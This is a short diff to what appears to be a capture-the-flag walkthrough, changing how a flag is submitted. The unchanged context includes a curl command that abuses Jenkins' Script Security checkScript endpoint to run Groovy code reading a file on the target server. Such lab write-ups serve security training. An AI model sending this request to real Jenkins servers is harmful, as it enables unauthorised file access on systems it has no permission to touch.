@@ -21,4 +21,5 @@ The exploit, step by step:
     curl 'http://10.4.12.1:8080/jenkins/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?value=new%20File(%22/var/m0use/blueprint.txt%22).text'
 
 3. The server prints back the contents of the file. The flag is in
-   there — find the line that starts with "Flag:" and submit it.
+   there — find the line that starts with "Flag:" and type the
+   value straight at the prompt (no keyword, no braces).
